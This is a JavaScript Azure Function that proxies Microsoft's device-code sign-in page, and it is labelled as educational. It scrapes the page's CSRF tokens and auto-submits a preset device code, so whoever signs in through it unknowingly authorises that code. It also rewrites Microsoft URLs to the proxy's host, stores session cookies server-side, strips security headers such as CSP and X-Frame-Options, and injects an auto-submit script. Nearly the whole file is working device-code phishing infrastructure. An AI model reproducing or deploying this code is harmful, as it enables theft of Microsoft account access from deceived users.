/**
 * Azure Function Device Code Auth Proxy
 * 
 * Proxies the Microsoft device auth flow, automatically submitting the device code
 * so users go straight to the sign-in page without manual code entry.
 * 
 * This code is provided for educational purposes only and provided without any liability or warranty.
 */

const { app } = require("@azure/functions");
const { getSession, setSession } = require("./devicecode_store");

const upstream = "login.microsoftonline.com";
const DEVICE_AUTH_PATH = "/common/oauth2/deviceauth";

const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "transfer-encoding",
];

app.http("deviceauth", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/auth/{*path}",
  handler: async (request, context) => {
    const url = new URL(request.url);
    const sessionId = url.searchParams.get('session');
    const originalHost = url.host;
    const originalProtocol = url.protocol;

    // Build upstream URL
    const upstreamUrl = new URL(`https://${upstream}`);
    
    // Get the path after /auth/
    let path = url.pathname.replace(/^\/auth\/?/, '/');
    if (path === '/' || path === '') {
      path = DEVICE_AUTH_PATH;
    }
    upstreamUrl.pathname = path;

    // Copy query params except our session ID
    for (const [key, value] of url.searchParams) {
      if (key !== 'session') {
        upstreamUrl.searchParams.set(key, value);
      }
    }

    // Get session data (includes stored cookies from previous requests)
    const session = sessionId ? getSession(sessionId) : null;

    // Check if this is the initial request - need to auto-submit device code
    if (session && session.user_code && !session.codeSubmitted && path === DEVICE_AUTH_PATH && request.method === 'GET') {
      context.log(`Auto-submitting device code for session ${sessionId}`);
      return await autoSubmitDeviceCode(session, sessionId, originalHost, originalProtocol, context);
    }

    // Regular proxy request - forward cookies from browser AND stored session cookies
    context.log(`Proxying ${request.method}: ${path} -> ${upstreamUrl.href}`);

    // Combine browser cookies with any stored session cookies
    let cookieHeader = request.headers.get('cookie') || '';
    if (session?.serverCookies) {
      // Merge server-side cookies with browser cookies
      const browserCookies = cookieHeader ? cookieHeader.split('; ') : [];
      const serverCookies = session.serverCookies.split('; ');
      const allCookies = new Map();
      
      // Server cookies first, browser cookies override
      serverCookies.forEach(c => {
        const [name] = c.split('=');
        allCookies.set(name, c);
      });
      browserCookies.forEach(c => {
        const [name] = c.split('=');
        allCookies.set(name, c);
      });
      
      cookieHeader = Array.from(allCookies.values()).join('; ');
    }

    const headers = new Headers();
    headers.set('Host', upstream);
    headers.set('Origin', `https://${upstream}`);
    headers.set('Referer', `https://${upstream}/`);
    headers.set('User-Agent', request.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    headers.set('Accept', request.headers.get('accept') || 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    headers.set('Accept-Language', 'en-US,en;q=0.9');
    
    if (cookieHeader) {
      headers.set('Cookie', cookieHeader);
    }
    
    if (request.headers.get('content-type')) {
      headers.set('Content-Type', request.headers.get('content-type'));
    }

    let body = null;
    if (request.method === 'POST') {
      body = await request.text();
      // Rewrite any references to our host back to Microsoft
      body = body.replace(new RegExp(escapeRegex(`${originalHost}/auth`), 'g'), upstream);
      body = body.replace(new RegExp(escapeRegex(originalHost), 'g'), upstream);
    }

    const response = await fetch(upstreamUrl.href, {
      method: request.method,
      headers: headers,
      body: body,
      redirect: 'manual',
    });

    context.log(`Upstream response: ${response.status}`);

    // Collect and store new cookies
    const newCookies = response.headers.getSetCookie?.() || [];
    if (newCookies.length > 0 && session) {
      const cookieValues = newCookies.map(c => c.split(';')[0]).join('; ');
      const existingCookies = session.serverCookies || '';
      const merged = mergeCookies(existingCookies, cookieValues);
      setSession(sessionId, { ...session, serverCookies: merged });
    }

    // Handle redirects - rewrite to go through our proxy
    if (response.status >= 300 && response.status < 400) {
      const location = response.headers.get('Location');
      if (location) {
        context.log(`Redirect to: ${location}`);
        const newLocation = rewriteUrl(location, originalHost, originalProtocol, sessionId);
        const responseHeaders = buildResponseHeaders(response, originalHost, newCookies);
        responseHeaders.set('Location', newLocation);
        
        return new Response(null, {
          status: response.status,
          headers: responseHeaders,
        });
      }
    }

    // Rewrite response body
    let responseBody = await response.text();
    responseBody = rewriteResponseBody(responseBody, originalHost, originalProtocol, sessionId);

    const responseHeaders = buildResponseHeaders(response, originalHost, newCookies);
    
    return new Response(responseBody, {
      status: response.status,
      headers: responseHeaders,
    });
  },
});

async function autoSubmitDeviceCode(session, sessionId, originalHost, originalProtocol, context) {
  // Step 1: Fetch the device auth page to get CSRF tokens and initial cookies
  context.log("Fetching device auth page...");
  
  const pageResponse = await fetch(`https://${upstream}${DEVICE_AUTH_PATH}`, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
    },
  });

  context.log(`Device auth page response: ${pageResponse.status}`);

  const pageHtml = await pageResponse.text();
  const initialCookies = pageResponse.headers.getSetCookie?.() || [];
  const cookieString = initialCookies.map(c => c.split(';')[0]).join('; ');

  context.log(`Got ${initialCookies.length} initial cookies`);

  // Extract CSRF tokens - Microsoft embeds these in a $Config JSON object
  let ctx = '';
  let flowToken = '';
  let canary = '';

  // Method 1: Look for $Config JSON object and log its keys
  const configMatch = pageHtml.match(/\$Config\s*=\s*(\{[\s\S]*?\});/);
  if (configMatch) {
    const configStr = configMatch[1];
    context.log(`$Config first 2000 chars: ${configStr.substring(0, 2000)}`);
    
    // Try various possible field names for the flow token
    const possibleCtxFields = ['sCtx', 'ctx', 'context', 'sessionCtx', 'sSessionCtx'];
    const possibleFTFields = ['sFT', 'flowToken', 'sFTTag', 'hpgact', 'hpgid'];
    
    for (const field of possibleCtxFields) {
      const match = configStr.match(new RegExp(`"${field}"\\s*:\\s*"([^"]+)"`));
      if (match) {
        ctx = match[1];
        context.log(`Found ctx in field: ${field}`);
        break;
      }
    }
    
    for (const field of possibleFTFields) {
      const match = configStr.match(new RegExp(`"${field}"\\s*:\\s*"([^"]+)"`));
      if (match) {
        flowToken = match[1];
        context.log(`Found flowToken in field: ${field}`);
        break;
      }
    }
    
    const canaryMatch = configStr.match(/"canary"\s*:\s*"([^"]+)"/);
    if (canaryMatch) canary = canaryMatch[1];
  }

  // Method 2: Look for hidden form fields
  if (!ctx) {
    const ctxInputMatch = pageHtml.match(/<input[^>]*name=["']ctx["'][^>]*value=["']([^"']+)["']/i);
    const ctxInputMatch2 = pageHtml.match(/<input[^>]*value=["']([^"']+)["'][^>]*name=["']ctx["']/i);
    if (ctxInputMatch) ctx = ctxInputMatch[1];
    else if (ctxInputMatch2) ctx = ctxInputMatch2[1];
  }
  if (!flowToken) {
    const ftInputMatch = pageHtml.match(/<input[^>]*name=["']flowToken["'][^>]*value=["']([^"']+)["']/i);
    const ftInputMatch2 = pageHtml.match(/<input[^>]*value=["']([^"']+)["'][^>]*name=["']flowToken["']/i);
    if (ftInputMatch) flowToken = ftInputMatch[1];
    else if (ftInputMatch2) flowToken = ftInputMatch2[1];
  }

  // Method 3: Search for any hidden inputs and log them
  const hiddenInputs = pageHtml.match(/<input[^>]*type=["']hidden["'][^>]*>/gi) || [];
  context.log(`Found ${hiddenInputs.length} hidden inputs:`);
  hiddenInputs.forEach((input, i) => {
    const nameMatch = input.match(/name=["']([^"']+)["']/);
    const valueMatch = input.match(/value=["']([^"']{0,50})/);
    if (nameMatch) {
      context.log(`  Hidden input ${i}: name="${nameMatch[1]}", value="${valueMatch ? valueMatch[1] + '...' : 'empty'}"`);
    }
  });

  // Method 4: Look for form action URL which might contain tokens
  const formMatch = pageHtml.match(/<form[^>]*action=["']([^"']+)["'][^>]*>/i);
  if (formMatch) {
    context.log(`Form action: ${formMatch[1]}`);
  }

  context.log(`Extracted tokens:`);
  context.log(`  ctx: ${ctx ? ctx.substring(0, 50) + '...' : 'MISSING'}`);
  context.log(`  flowToken: ${flowToken ? flowToken.substring(0, 50) + '...' : 'MISSING'}`);
  context.log(`  canary: ${canary ? canary.substring(0, 50) + '...' : 'not found'}`);

  // If tokens found, submit the code
  if (ctx && flowToken) {
    return await submitDeviceCode(session, sessionId, originalHost, originalProtocol, context, cookieString, initialCookies, ctx, flowToken, canary);
  }

  // Fallback: Maybe this page just needs the otc field posted with canary
  // Let's try submitting with just canary and otc
  if (canary) {
    context.log("Trying submission with just canary and otc...");
    return await submitDeviceCodeSimple(session, sessionId, originalHost, originalProtocol, context, cookieString, initialCookies, canary, pageHtml);
  }

  // Last resort: Return page with auto-fill
  context.log("WARNING: Falling back to pre-filled form with auto-submit");
  return await returnPrefilledPage(session, sessionId, originalHost, originalProtocol, pageHtml, initialCookies, cookieString, context);
}

async function submitDeviceCode(session, sessionId, originalHost, originalProtocol, context, cookieString, initialCookies, ctx, flowToken, canary) {
  context.log(`Submitting device code: ${session.user_code}`);

  const submitBody = new URLSearchParams({
    'otc': session.user_code,
    'flowToken': flowToken,
    'ctx': ctx,
  });
  
  if (canary) {
    submitBody.set('canary', canary);
  }

  const submitResponse = await fetch(`https://${upstream}${DEVICE_AUTH_PATH}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Cookie': cookieString,
      'Origin': `https://${upstream}`,
      'Referer': `https://${upstream}${DEVICE_AUTH_PATH}`,
    },
    body: submitBody.toString(),
    redirect: 'manual',
  });

  return await handleSubmitResponse(submitResponse, session, sessionId, originalHost, originalProtocol, context, cookieString, initialCookies);
}

async function submitDeviceCodeSimple(session, sessionId, originalHost, originalProtocol, context, cookieString, initialCookies, canary, pageHtml) {
  context.log(`Submitting device code (simple): ${session.user_code}`);

  // Look for the form's actual field names
  const formFields = {};
  
  // Get all input fields from the form
  const inputMatches = pageHtml.matchAll(/<input[^>]*name=["']([^"']+)["'][^>]*(?:value=["']([^"']*)["'])?[^>]*>/gi);
  for (const match of inputMatches) {
    const name = match[1];
    const value = match[2] || '';
    formFields[name] = value;
    context.log(`Form field: ${name} = ${value.substring(0, 30)}...`);
  }

  // Build submission with the code
  const submitBody = new URLSearchParams();
  submitBody.set('otc', session.user_code);
  
  // Add canary if we have it
  if (canary) {
    submitBody.set('canary', canary);
  }
  
  // Add any other hidden fields we found
  for (const [name, value] of Object.entries(formFields)) {
    if (name !== 'otc' && value) {
      submitBody.set(name, value);
    }
  }

  context.log(`Submitting with fields: ${Array.from(submitBody.keys()).join(', ')}`);

  const submitResponse = await fetch(`https://${upstream}${DEVICE_AUTH_PATH}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Cookie': cookieString,
      'Origin': `https://${upstream}`,
      'Referer': `https://${upstream}${DEVICE_AUTH_PATH}`,
    },
    body: submitBody.toString(),
    redirect: 'manual',
  });

  return await handleSubmitResponse(submitResponse, session, sessionId, originalHost, originalProtocol, context, cookieString, initialCookies);
}

async function handleSubmitResponse(submitResponse, session, sessionId, originalHost, originalProtocol, context, cookieString, initialCookies) {
  context.log(`Code submission response: ${submitResponse.status}`);

  const submitCookies = submitResponse.headers.getSetCookie?.() || [];
  const allCookieHeaders = [...initialCookies, ...submitCookies];
  const allCookieString = mergeCookies(cookieString, submitCookies.map(c => c.split(';')[0]).join('; '));

  context.log(`Total cookies after submit: ${allCookieHeaders.length}`);

  // Mark code as submitted and store cookies
  setSession(sessionId, {
    ...session,
    codeSubmitted: true,
    serverCookies: allCookieString,
  });

  // Handle redirect
  if (submitResponse.status >= 300 && submitResponse.status < 400) {
    const location = submitResponse.headers.get('Location');
    context.log(`Following redirect to: ${location}`);

    if (location) {
      return await followRedirectChain(location, allCookieString, allCookieHeaders, originalHost, originalProtocol, sessionId, context);
    }
  }

  // Got a direct response
  let html = await submitResponse.text();
  
  if (html.includes('AADSTS') || html.includes('error')) {
    const errorMatch = html.match(/AADSTS\d+[^<"]*/);
    if (errorMatch) {
      context.log(`Microsoft error: ${errorMatch[0]}`);
    }
  }

  html = rewriteResponseBody(html, originalHost, originalProtocol, sessionId);
  const responseHeaders = buildResponseHeaders(submitResponse, originalHost, allCookieHeaders);

  return new Response(html, {
    status: 200,
    headers: responseHeaders,
  });
}

async function returnPrefilledPage(session, sessionId, originalHost, originalProtocol, pageHtml, initialCookies, cookieString, context) {
  let modifiedHtml = pageHtml;
  
  // Pre-fill the code in the input field
  modifiedHtml = modifiedHtml.replace(
    /(<input[^>]*name=["']otc["'][^>]*)(>)/i,
    `$1 value="${session.user_code}"$2`
  );
  
  // Auto-submit via JavaScript
  modifiedHtml = modifiedHtml.replace(
    '</body>',
    `<script>
      document.addEventListener('DOMContentLoaded', function() {
        var otcInput = document.querySelector('input[name="otc"]');
        if (otcInput) {
          otcInput.value = "${session.user_code}";
          var form = otcInput.closest('form');
          if (form) {
            setTimeout(function() { form.submit(); }, 300);
          }
        }
      });
    </script>
    </body>`
  );
  
  modifiedHtml = rewriteResponseBody(modifiedHtml, originalHost, originalProtocol, sessionId);
  
  const responseHeaders = buildResponseHeaders({ headers: new Headers() }, originalHost, initialCookies);
  responseHeaders.set('Content-Type', 'text/html; charset=utf-8');
  
  setSession(sessionId, { ...session, codeSubmitted: true, serverCookies: cookieString });
  
  return new Response(modifiedHtml, {
    status: 200,
    headers: responseHeaders,
  });
}

async function followRedirectChain(location, cookieString, cookieHeaders, originalHost, originalProtocol, sessionId, context, depth = 0) {
  if (depth > 10) {
    context.log("Too many redirects, stopping");
    return new Response("Too many redirects", { status: 500 });
  }

  const fullUrl = location.startsWith('http') ? location : `https://${upstream}${location}`;
  context.log(`Following redirect (${depth}): ${fullUrl}`);

  const response = await fetch(fullUrl, {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Cookie': cookieString,
      'Referer': `https://${upstream}/`,
    },
    redirect: 'manual',
  });

  const newCookies = response.headers.getSetCookie?.() || [];
  const allCookieHeaders = [...cookieHeaders, ...newCookies];
  const newCookieString = mergeCookies(cookieString, newCookies.map(c => c.split(';')[0]).join('; '));

  if (response.status >= 300 && response.status < 400) {
    const nextLocation = response.headers.get('Location');
    if (nextLocation) {
      if (!nextLocation.includes('microsoftonline.com') && !nextLocation.includes('microsoft.com') && !nextLocation.startsWith('/')) {
        context.log(`External redirect to: ${nextLocation}`);
        const responseHeaders = buildResponseHeaders(response, originalHost, allCookieHeaders);
        responseHeaders.set('Location', nextLocation);
        return new Response(null, { status: 302, headers: responseHeaders });
      }
      
      return await followRedirectChain(nextLocation, newCookieString, allCookieHeaders, originalHost, originalProtocol, sessionId, context, depth + 1);
    }
  }

  let html = await response.text();
  html = rewriteResponseBody(html, originalHost, originalProtocol, sessionId);
  
  const responseHeaders = buildResponseHeaders(response, originalHost, allCookieHeaders);

  return new Response(html, {
    status: response.status,
    headers: responseHeaders,
  });
}

function mergeCookies(existing, newCookies) {
  const cookieMap = new Map();
  
  if (existing) {
    existing.split('; ').forEach(c => {
      const [name] = c.split('=');
      if (name) cookieMap.set(name, c);
    });
  }
  
  if (newCookies) {
    newCookies.split('; ').forEach(c => {
      const [name] = c.split('=');
      if (name) cookieMap.set(name, c);
    });
  }
  
  return Array.from(cookieMap.values()).join('; ');
}

function escapeRegex(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrl(url, originalHost, originalProtocol, sessionId) {
  if (!url) return url;
  
  let newUrl = url;
  
  newUrl = newUrl.replace(/https:\/\/login\.microsoftonline\.com/g, `${originalProtocol}//${originalHost}/auth`);
  newUrl = newUrl.replace(/https:\/\/login\.microsoft\.com/g, `${originalProtocol}//${originalHost}/auth`);
  
  if (newUrl.startsWith('/') && !newUrl.startsWith('/auth')) {
    newUrl = `/auth${newUrl}`;
  }

  if (sessionId && !newUrl.includes('session=')) {
    const separator = newUrl.includes('?') ? '&' : '?';
    newUrl = `${newUrl}${separator}session=${sessionId}`;
  }

  return newUrl;
}

function rewriteResponseBody(html, originalHost, originalProtocol, sessionId) {
  const baseUrl = `${originalProtocol}//${originalHost}`;
  
  let result = html
    .replace(/https:\/\/login\.microsoftonline\.com/g, `${baseUrl}/auth`)
    .replace(/https:\/\/login\.microsoft\.com/g, `${baseUrl}/auth`)
    .replace(/https:\/\/logincdn\.msauth\.net/g, `${baseUrl}/cdn`)
    .replace(/\/\/login\.microsoftonline\.com/g, `//${originalHost}/auth`)
    .replace(/\/\/login\.microsoft\.com/g, `//${originalHost}/auth`)
    .replace(/https:\\u002f\\u002flogin\.microsoftonline\.com/g, `${baseUrl.replace(/\//g, '\\u002f')}/auth`)
    .replace(/login\.microsoftonline\.com/g, `${originalHost}/auth`)
    .replace(/login\.microsoft\.com/g, `${originalHost}/auth`);

  return result;
}

function buildResponseHeaders(response, originalHost, cookieHeaders = []) {
  const headers = new Headers();
  
  for (const [key, value] of response.headers) {
    const lowerKey = key.toLowerCase();
    if (!delete_headers.includes(lowerKey) && lowerKey !== 'set-cookie') {
      headers.set(key, value);
    }
  }

  const processedCookies = new Set();
  cookieHeaders.forEach(cookie => {
    let modifiedCookie = cookie
      .replace(/;\s*domain=[^;]+/gi, '')
      .replace(/;\s*secure/gi, '')
      .replace(/login\.microsoftonline\.com/g, originalHost)
      .replace(/\.microsoftonline\.com/g, '');
    
    if (!modifiedCookie.toLowerCase().includes('samesite')) {
      modifiedCookie += '; SameSite=None; Secure';
    }
    
    const cookieName = modifiedCookie.split('=')[0];
    if (!processedCookies.has(cookieName)) {
      processedCookies.add(cookieName);
      headers.append('Set-Cookie', modifiedCookie);
    }
  });

  headers.set('Access-Control-Allow-Origin', '*');
  headers.set('Access-Control-Allow-Credentials', 'true');

  return headers;
}

